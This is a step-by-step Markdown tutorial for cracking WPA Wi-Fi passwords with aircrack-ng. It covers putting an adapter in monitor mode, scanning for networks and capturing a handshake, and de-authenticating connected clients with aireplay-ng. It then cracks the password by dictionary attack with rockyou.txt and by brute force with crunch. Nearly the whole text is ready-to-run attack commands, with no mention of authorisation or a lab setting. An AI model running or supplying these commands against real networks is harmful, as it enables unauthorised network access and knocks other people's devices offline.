### Prerequisites

1. **Update the System:**
   ```bash
   sudo apt update
   ```

2. **Install Aircrack-ng:**
   ```bash
   sudo apt install aircrack-ng
   ```
   Verify the installation:
   ```bash
   aircrack-ng --help
   ```

3. **Install Crunch:**
   ```bash
   sudo apt install crunch
   ```
   Verify the installation:
   ```bash
   crunch -h
   ```

4. **Wireless Adapter:**
   Ensure you have a wireless adapter capable of performing packet injection and entering monitor mode.

### A. Start General Info

1. **Switch to Super User:**
   ```bash
   sudo su
   ```

2. **Check Network Interfaces:**
   ```bash
   iwconfig
   ```
   Ensure the network interface is in `Mode:managed`.

3. **Check Running Processes:**
   ```bash
   airmon-ng check
   ```

4. **Kill Interfering Processes:**
   ```bash
   airmon-ng check kill
   ```

### B. Change Manager Mode to Monitor Mode

1. **Start Monitor Mode:**
   ```bash
   airmon-ng start wlan0
   ```
   Replace `wlan0` with your actual network interface name if different.

### C. Gather Basic Info

1. **Scan for Networks:**
   ```bash
   airodump-ng wlan0
   ```
   Stop the process after 10-15 seconds and note down the `BSSID`, `CH (channel)`, and `ESSID`.

### D. Dump the Capture File

1. **Create Directory Structure:**
   ```
   -|New_Folder
      |- Captured_Files
      |- rockyou
   ```

2. **Capture Handshake:**
   ```bash
   sudo su
   airodump-ng wlan0 -d <bssid>
   ```
   Wait until you see `Handshake: bssid` at the top.

3. **De-authenticate Clients:**
   ```bash
   aireplay-ng --deauth 0 -a <bssid> wlan0
   ```
   Close the execution after 20 seconds.

4. **Capture Files:**
   ```bash
   airodump-ng -w file_name -c <ch> --bssid <bssid> wlan0
   ```
   Close after 20 seconds.

5. **Re-run De-auth and Capture:**
   Repeat the de-auth and capture process to ensure you have the handshake.

6. **Check Captured Files:**
   ```bash
   ls
   ```
   You should see files in `Captured_Files` folder with extensions `.csv`, `.netxml`, and `.cap`.

### E. Dictionary Attack (Method One)

1. **Download Rockyou Wordlist:**
   Download the `rockyou.txt` file from the internet and extract it into the `rockyou` folder.

2. **Use Built-in Rockyou (Optional):**
   ```bash
   gunzip -c /usr/share/wordlists/rockyou.txt.gz > ~/Desktop/New_Folder/rockyou/rockyou.txt
   ```

3. **Change Permissions:**
   ```bash
   chmod 777 ~/Desktop/New_Folder/rockyou/rockyou.txt
   ```

4. **Crack the Password:**
   ```bash
   aircrack-ng file_name.cap -w /Desktop/New_Folder/rockyou/rockyou.txt
   ```
   Wait for the process to complete.

### F. Brute Force Attack (Method Two)

1. **Number Only:**
   ```bash
   crunch 4 4 0123456789 | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
   ```

2. **Character Set:**
   ```bash
   crunch 8 8 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
   ```

3. **Complex Character Set:**
   ```bash
   crunch 12 12 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+=-[]{}|;:'",.<>?/ | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
   ```

### Post-Process

1. **Stop Monitor Mode:**
   ```bash
   airmon-ng stop wlan0
   ```